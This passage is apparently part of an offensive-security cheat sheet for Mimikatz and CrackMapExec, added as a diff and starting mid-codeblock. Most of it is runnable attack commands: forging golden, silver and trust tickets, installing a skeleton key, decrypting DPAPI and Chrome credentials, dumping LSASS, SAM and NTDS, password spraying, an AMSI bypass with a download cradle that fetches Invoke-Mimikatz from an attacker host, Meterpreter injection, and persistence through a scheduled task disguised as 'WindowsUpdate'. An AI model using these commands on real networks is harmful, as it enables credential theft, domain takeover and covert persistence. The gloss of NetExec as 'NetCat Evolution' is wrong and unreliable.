+kerberos::golden /user:Administrator /domain:DOMAIN.LOCAL /sid:DOMAIN_SID /krbtgt:KRBTGT_HASH /target:TARGET.DOMAIN.LOCAL /service:cifs /ptt
+
+# Save to file instead of injecting
+kerberos::golden /user:Administrator /domain:DOMAIN.LOCAL /sid:DOMAIN_SID /krbtgt:KRBTGT_HASH /ticket:golden.kirbi
+```
+
+**Silver Ticket Creation:**
+
+```bash
+# Create silver ticket (requires service account hash)
+kerberos::golden /user:Administrator /domain:DOMAIN.LOCAL /sid:DOMAIN_SID /target:TARGET.DOMAIN.LOCAL /service:cifs /rc4:SERVICE_NTHASH /ptt
+
+# Silver ticket for specific services
+# CIFS (file share)
+kerberos::golden /user:Administrator /domain:DOMAIN.LOCAL /sid:DOMAIN_SID /target:SERVER.DOMAIN.LOCAL /service:cifs /rc4:HASH /ptt
+
+# HOST (scheduled tasks, services)
+kerberos::golden /user:Administrator /domain:DOMAIN.LOCAL /sid:DOMAIN_SID /target:SERVER.DOMAIN.LOCAL /service:host /rc4:HASH /ptt
+
+# RPCSS (WMI)
+kerberos::golden /user:Administrator /domain:DOMAIN.LOCAL /sid:DOMAIN_SID /target:SERVER.DOMAIN.LOCAL /service:rpcss /rc4:HASH /ptt
+
+# HTTP (PowerShell remoting)
+kerberos::golden /user:Administrator /domain:DOMAIN.LOCAL /sid:DOMAIN_SID /target:SERVER.DOMAIN.LOCAL /service:http /rc4:HASH /ptt
+
+# LDAP (directory operations)
+kerberos::golden /user:Administrator /domain:DOMAIN.LOCAL /sid:DOMAIN_SID /target:DC.DOMAIN.LOCAL /service:ldap /rc4:HASH /ptt
+```
+
+**[Inference]** Silver tickets are more stealthy than golden tickets as they target specific services rather than domain-wide access. However, detection capabilities vary by organization's monitoring configuration.
+
+### Advanced Mimikatz Techniques
+
+**Skeleton Key Attack:**
+
+```bash
+# Install skeleton key (requires DA, allows password "mimikatz" for all users)
+misc::skeleton
+
+# After installation, authenticate with any username and password "mimikatz"
+net use \\DC\C$ /user:DOMAIN\anyuser mimikatz
+```
+
+**[Unverified]** Skeleton key persistence across reboots depends on system configuration and may be detected by security monitoring.
+
+**Trust Ticket (SID History):**
+
+```bash
+# Create trust ticket for child-parent domain escalation kerberos::golden /user:Administrator /domain:CHILD.DOMAIN.LOCAL /sid:CHILD_SID /sids:ENTERPRISE_ADMINS_SID /krbtgt:KRBTGT_HASH /ptt
+
+# Multiple SID injection
+
+kerberos::golden /user:Administrator /domain:CHILD.DOMAIN.LOCAL /sid:CHILD_SID /sids:SID1,SID2,SID3 /krbtgt:KRBTGT_HASH /ptt
+
+# Cross-forest trust ticket
+
+kerberos::golden /user:Administrator /domain:DOMAIN.LOCAL /sid:DOMAIN_SID /rc4:TRUST_KEY /service:krbtgt /target:TRUSTED.DOMAIN.LOCAL /ptt
+````
+
+**Credential Guard Bypass:**
+
+```bash
+# Check if Credential Guard is enabled
+sekurlsa::credman
+
+# [Unverified] Credential Guard bypass techniques vary by Windows version and patch level
+# Some methods require kernel-level access
+
+# Export protected credentials (limited effectiveness with Credential Guard)
+sekurlsa::dpapi
+````
+
+**DPAPI Credential Decryption:**
+
+```bash
+# Decrypt Chrome credentials
+dpapi::chrome /in:"C:\Users\USERNAME\AppData\Local\Google\Chrome\User Data\Default\Login Data"
+
+# Decrypt saved credentials
+sekurlsa::dpapi
+
+# Dump DPAPI masterkeys
+sekurlsa::dpapi
+
+# Decrypt with masterkey
+dpapi::cred /in:CREDENTIAL_FILE /masterkey:MASTERKEY_VALUE
+
+# Dump DPAPI backup keys (DC only)
+lsadump::backupkeys /system:DC.DOMAIN.LOCAL /export
+```
+
+**Certificate Export:**
+
+```bash
+# Export certificates with private keys
+crypto::certificates /export
+
+# Export to PFX format
+crypto::certificates /systemstore:local_machine /store:my /export
+
+# Export specific certificate
+crypto::cng
+```
+
+**Token Manipulation:**
+
+```bash
+# List tokens
+token::list
+
+# Elevate to SYSTEM
+token::elevate
+
+# Elevate to specific account
+token::elevate /domainadmin
+
+# Revert token
+token::revert
+
+# Run command with token
+token::run /process:cmd.exe
+```
+
+**Credential Vault:**
+
+```bash
+# Dump Windows Vault credentials
+vault::cred
+
+# Dump credential manager
+vault::list
+```
+
+### Mimikatz Over Network (Remote Operations)
+
+**Remote Credential Dumping:**
+
+```bash
+# Using PsExec to run mimikatz remotely
+psexec.exe \\TARGET -u DOMAIN\Administrator -p Password123! -s cmd.exe
+# Then run mimikatz commands
+
+# Or copy and execute
+copy mimikatz.exe \\TARGET\C$\Temp\
+psexec.exe \\TARGET -u DOMAIN\Administrator -p Password123! C:\Temp\mimikatz.exe "privilege::debug sekurlsa::logonpasswords exit" > output.txt
+```
+
+**LSASS Memory Dump (Remote):**
+
+```bash
+# Create memory dump with Task Manager equivalent
+comsvcs.dll,MiniDump PID C:\Temp\lsass.dmp full
+
+# Or with ProcDump
+procdump.exe -ma lsass.exe lsass.dmp
+
+# Analyze dump offline with mimikatz
+sekurlsa::minidump lsass.dmp
+sekurlsa::logonpasswords
+```
+
+### Mimikatz Evasion Techniques
+
+**Obfuscation:**
+
+```bash
+# Invoke-Mimikatz with AMSI bypass
+powershell -ep bypass
+[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
+IEX (New-Object Net.WebClient).DownloadString('http://ATTACKER/Invoke-Mimikatz.ps1')
+Invoke-Mimikatz -Command '"privilege::debug" "sekurlsa::logonpasswords"'
+
+# Use SafetyKatz (obfuscated mimikatz)
+SafetyKatz.exe "sekurlsa::logonpasswords"
+```
+
+**In-Memory Execution:**
+
+```powershell
+# Reflective loading
+IEX (New-Object Net.WebClient).DownloadString('http://ATTACKER/Invoke-Mimikatz.ps1')
+Invoke-Mimikatz -DumpCreds
+
+# Invoke-Mimikatz specific commands
+Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "exit"'
+
+# Output to variable
+$creds = Invoke-Mimikatz -DumpCreds
+```
+
+## CrackMapExec
+
+CrackMapExec (CME) is a post-exploitation framework for network enumeration, credential validation, and lateral movement across Windows networks.
+
+### Installation and Setup
+
+```bash
+# Install via apt (Kali)
+sudo apt install crackmapexec
+
+# Or via pipx (recommended for latest version)
+pipx install crackmapexec
+
+# Update
+pipx upgrade crackmapexec
+
+# Initialize database
+cme
+```
+
+### Basic Syntax and Authentication
+
+```bash
+# Basic syntax
+cme <protocol> <target> -u <username> -p <password>
+
+# Protocols: smb, winrm, ssh, mssql, ldap, ftp, rdp
+
+# Single target
+cme smb 192.168.1.10 -u Administrator -p Password123
+
+# Multiple targets
+cme smb 192.168.1.0/24 -u Administrator -p Password123
+cme smb targets.txt -u Administrator -p Password123
+
+# Username/password lists
+cme smb 192.168.1.0/24 -u users.txt -p passwords.txt
+
+# Continue on success (don't stop after first valid cred)
+cme smb 192.168.1.0/24 -u users.txt -p passwords.txt --continue-on-success
+
+# Hash authentication
+cme smb 192.168.1.10 -u Administrator -H NTHASH
+cme smb 192.168.1.10 -u Administrator -H LMHASH:NTHASH
+
+# Null authentication
+cme smb 192.168.1.10 -u '' -p ''
+
+# Local authentication
+cme smb 192.168.1.10 -u Administrator -p Password123 --local-auth
+```
+
+### SMB Protocol Operations
+
+**SMB Enumeration:**
+
+```bash
+# Check SMB signing
+cme smb 192.168.1.0/24
+
+# Enumerate shares
+cme smb 192.168.1.10 -u user -p pass --shares
+
+# Enumerate shares with access permissions
+cme smb 192.168.1.0/24 -u user -p pass --shares
+
+# Enumerate sessions
+cme smb 192.168.1.10 -u user -p pass --sessions
+
+# Enumerate disks
+cme smb 192.168.1.10 -u user -p pass --disks
+
+# Enumerate logged on users
+cme smb 192.168.1.10 -u user -p pass --loggedon-users
+
+# Enumerate domain users
+cme smb 192.168.1.10 -u user -p pass --users
+
+# Enumerate domain groups
+cme smb 192.168.1.10 -u user -p pass --groups
+
+# Enumerate local users
+cme smb 192.168.1.10 -u user -p pass --local-users
+
+# Enumerate local groups
+cme smb 192.168.1.10 -u user -p pass --local-groups
+
+# RID brute force
+cme smb 192.168.1.10 -u user -p pass --rid-brute
+
+# Pass-the-Hash spray
+cme smb 192.168.1.0/24 -u Administrator -H NTHASH --local-auth
+```
+
+**Credential Validation:**
+
+```bash
+# Password spray (careful with lockout policies)
+cme smb 192.168.1.0/24 -u users.txt -p 'Password123' --continue-on-success
+
+# Validate single credential across network
+cme smb 192.168.1.0/24 -u Administrator -p Password123
+
+# Check local admin access (Pwn3d! indicator)
+cme smb 192.168.1.0/24 -u Administrator -p Password123
+
+# Output shows:
+# [+] = Valid credentials
+# (Pwn3d!) = Local admin rights
+```
+
+**Command Execution:**
+
+```bash
+# Execute command via WMI
+cme smb 192.168.1.10 -u Administrator -p Password123 -x "whoami"
+
+# Execute PowerShell command
+cme smb 192.168.1.10 -u Administrator -p Password123 -X "Get-Process"
+
+# Execute command across multiple targets
+cme smb 192.168.1.0/24 -u Administrator -p Password123 -x "ipconfig"
+
+# No output (fire and forget)
+cme smb 192.168.1.10 -u Administrator -p Password123 -x "whoami" --no-output
+```
+
+**File Operations:**
+
+```bash
+# Spider shares for interesting files
+cme smb 192.168.1.10 -u user -p pass -M spider_plus
+
+# Get file
+cme smb 192.168.1.10 -u user -p pass --get-file "C:\Windows\System32\drivers\etc\hosts" hosts.txt
+
+# Put file
+cme smb 192.168.1.10 -u user -p pass --put-file payload.exe "C:\Windows\Temp\payload.exe"
+
+# Download file from share
+cme smb 192.168.1.10 -u user -p pass --share C$ --get-file Windows/System32/config/SAM SAM.save
+```
+
+**Credential Dumping:**
+
+```bash
+# Dump SAM hashes
+cme smb 192.168.1.10 -u Administrator -p Password123 --sam
+
+# Dump LSA secrets
+cme smb 192.168.1.10 -u Administrator -p Password123 --lsa
+
+# Dump NTDS.dit (Domain Controller)
+cme smb DC_IP -u Administrator -p Password123 --ntds
+
+# Dump NTDS with specific options
+cme smb DC_IP -u Administrator -p Password123 --ntds --users
+cme smb DC_IP -u Administrator -p Password123 --ntds --users --enabled
+
+# Use VSS method
+cme smb DC_IP -u Administrator -p Password123 --ntds vss
+```
+
+### Built-in Modules
+
+**List Available Modules:**
+
+```bash
+# List all modules for protocol
+cme smb --list-modules
+cme winrm --list-modules
+
+# Module info
+cme smb -M MODULE_NAME --module-info
+```
+
+**Common SMB Modules:**
+
+```bash
+# Mimikatz execution
+cme smb 192.168.1.10 -u Administrator -p Password123 -M mimikatz
+
+# Mimikatz with specific command
+cme smb 192.168.1.10 -u Administrator -p Password123 -M mimikatz -o COMMAND="sekurlsa::logonpasswords"
+
+# Enumerate antivirus
+cme smb 192.168.1.0/24 -u user -p pass -M enum_avproducts
+
+# Enumerate Chrome credentials
+cme smb 192.168.1.10 -u Administrator -p Password123 -M enum_chrome
+
+# Check for MS17-010 (EternalBlue)
+cme smb 192.168.1.0/24 -M ms17-010
+
+# Check for MS08-067
+cme smb 192.168.1.0/24 -M ms08-067
+
+# Enumerate network interfaces
+cme smb 192.168.1.10 -u user -p pass -M enum_network
+
+# PetitPotam check
+cme smb 192.168.1.0/24 -M petitpotam
+
+# Check WebClient service (for relay attacks)
+cme smb 192.168.1.0/24 -M webdav
+
+# Dump LAPS passwords
+cme ldap DC_IP -u user -p pass -M laps
+
+# GPP password extraction
+cme smb 192.168.1.10 -u user -p pass -M gpp_password
+
+# WDigest enable (downgrade for plaintext creds)
+cme smb 192.168.1.10 -u Administrator -p Password123 -M wdigest -o ACTION=enable
+
+# Spider Plus (enhanced file searching)
+cme smb 192.168.1.10 -u user -p pass -M spider_plus
+cme smb 192.168.1.10 -u user -p pass -M spider_plus -o READ_ONLY=false
+
+# Procdump LSASS
+cme smb 192.168.1.10 -u Administrator -p Password123 -M procdump
+
+# UAC status check
+cme smb 192.168.1.0/24 -u user -p pass -M uac
+
+# Enumeration modules
+cme smb 192.168.1.10 -u user -p pass -M enum_dns
+cme smb 192.168.1.10 -u user -p pass -M met_inject -o LHOST=ATTACKER_IP LPORT=4444
+```
+
+### LDAP Protocol Operations
+
+```bash
+# Basic LDAP authentication
+cme ldap DC_IP -u user -p pass
+
+# Enumerate domain users
+cme ldap DC_IP -u user -p pass --users
+
+# Enumerate domain groups
+cme ldap DC_IP -u user -p pass --groups
+
+# Enumerate computers
+cme ldap DC_IP -u user -p pass --computers
+
+# Check for AS-REP Roasting
+cme ldap DC_IP -u user -p pass --asreproast output.txt
+
+# Check for Kerberoasting
+cme ldap DC_IP -u user -p pass --kerberoasting output.txt
+
+# Enumerate trusted domains
+cme ldap DC_IP -u user -p pass --trusted-for-delegation
+
+# Get domain password policy
+cme ldap DC_IP -u user -p pass --pass-pol
+
+# Admin count users
+cme ldap DC_IP -u user -p pass --admin-count
+
+# Enumerate GMSAs
+cme ldap DC_IP -u user -p pass --gmsa
+
+# Get LAPS passwords
+cme ldap DC_IP -u user -p pass -M laps
+
+# Bloodhound data collection
+cme ldap DC_IP -u user -p pass --bloodhound -ns DC_IP --collection All
+```
+
+### WinRM Protocol Operations
+
+```bash
+# Basic WinRM authentication
+cme winrm 192.168.1.10 -u Administrator -p Password123
+
+# Execute command
+cme winrm 192.168.1.10 -u Administrator -p Password123 -x "whoami"
+
+# PowerShell command
+cme winrm 192.168.1.10 -u Administrator -p Password123 -X "Get-Process"
+
+# With hash
+cme winrm 192.168.1.10 -u Administrator -H NTHASH
+
+# Check multiple hosts for WinRM access
+cme winrm 192.168.1.0/24 -u Administrator -p Password123
+```
+
+### MSSQL Protocol Operations
+
+```bash
+# Basic MSSQL authentication
+cme mssql 192.168.1.10 -u sa -p Password123
+
+# Execute query
+cme mssql 192.168.1.10 -u sa -p Password123 -q "SELECT @@version"
+
+# Execute command via xp_cmdshell
+cme mssql 192.168.1.10 -u sa -p Password123 -x "whoami"
+
+# Check if xp_cmdshell is enabled
+cme mssql 192.168.1.10 -u sa -p Password123 -M mssql_priv
+
+# Enumerate MSSQL instances
+cme mssql 192.168.1.0/24 -u sa -p Password123
+
+# Windows authentication
+cme mssql 192.168.1.10 -u DOMAIN\\user -p password -d DOMAIN
+```
+
+### SSH Protocol Operations
+
+```bash
+# SSH authentication
+cme ssh 192.168.1.10 -u root -p password
+
+# With key
+cme ssh 192.168.1.10 -u root --key-file id_rsa
+
+# Execute command
+cme ssh 192.168.1.10 -u root -p password -x "id"
+
+# Sudo command execution
+cme ssh 192.168.1.10 -u user -p password --sudo-check
+cme ssh 192.168.1.10 -u user -p password -x "whoami" --sudo
+```
+
+### Database Management
+
+```bash
+# View database
+cme smb --show-credentials
+cme smb --show-hosts
+
+# Export database
+cme smb --export-db creds.db
+
+# Clear database
+cme smb --clear-database
+
+# View specific credential types
+cme smb --show-credentials --filter-credentials ntlm
+```
+
+### Advanced CrackMapExec Techniques
+
+**Relay Attack Preparation:**
+
+```bash
+# Identify hosts without SMB signing
+cme smb 192.168.1.0/24 --gen-relay-list relay_targets.txt
+
+# Check for WebClient service (coercion targets)
+cme smb 192.168.1.0/24 -u user -p pass -M webdav
+
+# Use with ntlmrelayx
+impacket-ntlmrelayx -tf relay_targets.txt -smb2support
+```
+
+**Password Policy Enumeration:**
+
+```bash
+# SMB method
+cme smb DC_IP -u user -p pass --pass-pol
+
+# LDAP method (more detailed)
+cme ldap DC_IP -u user -p pass --pass-pol
+```
+
+**Kerberos Operations:**
+
+```bash
+# Use Kerberos authentication
+cme smb TARGET.DOMAIN.LOCAL -u user -p pass -k
+
+# Export tickets
+export KRB5CCNAME=/path/to/ticket.ccache
+cme smb TARGET.DOMAIN.LOCAL -u user --use-kcache
+```
+
+**Logging and Output:**
+
+```bash
+# Verbose output
+cme smb 192.168.1.0/24 -u user -p pass --verbose
+
+# Debug output
+cme smb 192.168.1.0/24 -u user -p pass --debug
+
+# Specify log file
+cme smb 192.168.1.0/24 -u user -p pass --log cme_output.log
+
+# Disable logging
+cme smb 192.168.1.0/24 -u user -p pass --no-log
+```
+
+**Concurrent Connections:**
+
+```bash
+# Default threads: 100
+# Adjust thread count
+cme smb 192.168.1.0/24 -u user -p pass -t 50
+
+# Single threaded (stealthier)
+cme smb 192.168.1.0/24 -u user -p pass -t 1
+```
+
+**Chaining with Other Tools:**
+
+```bash
+# Extract credentials and use with impacket
+cme smb 192.168.1.10 -u Administrator -p Password123 --sam --lsa
+# Copy NTLM hash from output
+impacket-wmiexec -hashes :NTHASH DOMAIN/Administrator@TARGET_IP
+
+# Bloodhound integration
+cme ldap DC_IP -u user -p pass --bloodhound -ns DC_IP -c All
+# Import JSON files into Bloodhound
+
+# Combine with Responder for credential capture
+responder -I eth0 -dwv
+# In another terminal
+cme smb 192.168.1.0/24 --gen-relay-list targets.txt
+```
+
+### CrackMapExec Operational Patterns
+
+**Initial Access Pattern:**
+
+```bash
+# 1. Network discovery
+cme smb 192.168.1.0/24
+
+# 2. Credential validation
+cme smb 192.168.1.0/24 -u users.txt -p passwords.txt --continue-on-success
+
+# 3. Identify local admin access
+cme smb 192.168.1.0/24 -u Administrator -H NTHASH
+
+# 4. Dump credentials
+cme smb COMPROMISED_HOST -u Administrator -H NTHASH --sam --lsa
+
+# 5. Lateral movement
+cme smb NEW_TARGET -u Administrator -H NEW_NTHASH -x "whoami"
+```
+
+**Domain Enumeration Pattern:**
+
+```bash
+# 1. Password policy
+cme ldap DC_IP -u user -p pass --pass-pol
+
+# 2. User enumeration
+cme ldap DC_IP -u user -p pass --users
+
+# 3. Group enumeration
+cme ldap DC_IP -u user -p pass --groups
+
+# 4. AS-REP Roasting
+cme ldap DC_IP -u user -p pass --asreproast asrep_hashes.txt
+
+# 5. Kerberoasting
+cme ldap DC_IP -u user -p pass --kerberoasting kerberoast_hashes.txt
+
+# 6. Bloodhound collection
+cme ldap DC_IP -u user -p pass --bloodhound -ns DC_IP -c All
+```
+
+**Persistence Establishment:**
+
+```bash
+# 1. Identify all systems with local admin
+cme smb 192.168.1.0/24 -u Administrator -H NTHASH | grep "Pwn3d"
+
+# 2. Enable WDigest for future plaintext capture
+cme smb TARGET_LIST -u Administrator -H NTHASH -M wdigest -o ACTION=enable
+
+# 3. Create scheduled tasks (persistence)
+cme smb TARGET -u Administrator -H NTHASH -x 'schtasks /create /tn "WindowsUpdate" /tr "powershell -enc PAYLOAD" /sc onlogon /ru System'
+```
+
+---
+
+**Important Related Topics:**
+
+- **Covenant C2 Framework**: Alternative to Mimikatz for in-memory credential theft with C2 capabilities
+- **Rubeus**: Kerberos-focused exploitation tool complementing Mimikatz functionality
+- **PowerView**: PowerShell Active Directory enumeration complementing BloodHound
+- **Empire/Starkiller**: Post-exploitation framework integrating many of these tools
+- **NetExec (NetCat Evolution)**: CrackMapExec successor with enhanced features
+- **Kerbrute**: Fast Kerberos-based user enumeration and password spraying
+- **ADModule**: Pure PowerShell AD enumeration without BloodHound dependencies
+
+---
+
